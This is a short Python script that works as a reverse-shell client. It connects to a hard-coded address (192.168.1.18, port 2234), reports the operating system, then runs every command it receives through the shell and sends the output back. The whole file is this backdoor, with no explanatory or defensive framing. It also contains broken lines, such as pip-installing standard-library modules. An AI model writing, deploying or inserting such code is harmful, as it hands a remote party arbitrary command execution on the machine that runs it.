import os
os.system("pip install socket")
os.system("pip install threading")
os.system("pip install subprocess")
from socket import *
from threading import *
import subprocess

class client:
    def __init__(self):
        self.cli=socket(AF_INET,SOCK_STREAM)
        address=('192.168.1.18',2234)
        self.cli.connect(address)
        self.name=os.name
        self.cli.send(self.name.encode())
    def sender(self,messg):
        self.cli.send(messg.encode())
    def reci(self):
        while True:
            self.data=self.cli.recv(1024).decode()
            os.system(str(self.data))
            self.output=subprocess.check_output(str(self.data),shell=True)
            yield self.output.decode('ascii')
            
    def main(self):
        while True:
            print("===================\n")
            for com in self.reci():
                self.sender(com)

cl=client()
rp=Thread(target=cl.reci)
rp.daemon=True
rp.start()
cl.main()
